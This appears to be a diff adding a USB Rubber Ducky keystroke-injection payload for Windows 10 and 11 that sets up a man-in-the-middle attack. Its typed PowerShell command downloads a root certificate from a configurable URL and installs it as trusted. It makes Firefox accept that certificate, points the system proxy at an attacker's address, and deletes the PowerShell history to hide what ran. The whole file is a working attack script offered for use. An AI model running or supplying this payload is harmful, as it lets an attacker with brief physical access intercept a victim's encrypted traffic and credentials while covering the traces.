@@ -1,0 +1,55 @@
+REM Title: Windows Duck In The Middle
+REM Author: Julien Morice
+REM Description: The payload configures the target PC user to redirect network traffic via a proxy, enabling a Man-in-the-middle attack.
+REM Target: Windows 10, 11
+REM Version: 1.0
+REM Category: Execution
+
+
+REM Medium delay time
+DEFINE MEDIUM 2500
+REM Short delay time
+DEFINE SHORT 500
+REM The download link for your Trusted Root CA certificate
+DEFINE CERT-URL http://127.0.0.1:8080/cert
+REM Your proxy's IP address
+DEFINE PROXY-IP 127.0.0.1
+REM Your proxy port
+DEFINE PROXY-PORT 8080
+
+
+DELAY MEDIUM
+CTRL GUI d
+
+DELAY SHORT
+GUI x
+
+DELAY SHORT
+STRING i
+
+DELAY MEDIUM
+STRING $a = New-TemporaryFile; try { Invoke-WebRequest -Uri "
+STRING CERT-URL
+STRING " -OutFile $a; Import-Certificate -FilePath $a -CertStoreLocation "Cert:\CurrentUser\Root"; if (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles") { Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles" -Filter "prefs.js" -Recurse | ForEach-Object { (Get-Content $_.FullName) -replace '"security.enterprise_roots.enabled", false', '"security.enterprise_roots.enabled", true' | Set-Content $_.FullName } }; @{"ProxyServer" = "
+STRING PROXY-IP
+STRING :
+STRING PROXY-PORT
+STRING "; "ProxyEnable" = "1"}.GetEnumerator() | ForEach-Object { Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name $_.Name -Value $_.Value }} finally { Remove-Item $a; Remove-Item (Get-PSreadlineOption).HistorySavePath; exit }
+
+DELAY SHORT
+ENTER
+
+DELAY MEDIUM
+ALT TAB
+
+DELAY SHORT
+TAB
+
+DELAY SHORT
+ENTER
+
+DELAY SHORT
+CTRL GUI F4
+
+DELAY SHORT
+ATTACKMODE OFF
